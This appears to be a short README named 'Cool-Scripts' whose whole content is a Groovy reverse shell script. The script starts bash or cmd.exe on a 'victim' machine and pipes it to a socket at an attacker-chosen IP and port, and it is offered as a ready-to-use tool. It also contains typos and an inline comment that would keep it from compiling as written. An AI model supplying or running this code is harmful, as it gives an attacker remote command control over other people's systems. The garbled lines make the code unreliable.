# Cool-Scripts
Here there are some useful scripts that come to my mind. 

### Groovy reverse listener script(Java)
Make sure u use the correct route (Depends if victim is Windows or Linux)

```
String host="{YOUR_IP}";
int port={THE PORT U WANT TO USE};
String cmd="/bin/bash"; <-LINUX ----- WINDOWS -> String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=newSocket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStreampo=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();Thread.sleep(50);
  try{
     p.exitValue();
     break;
     }
  catch (Exception e){}
  };
  p.destroy();
s.close();
```
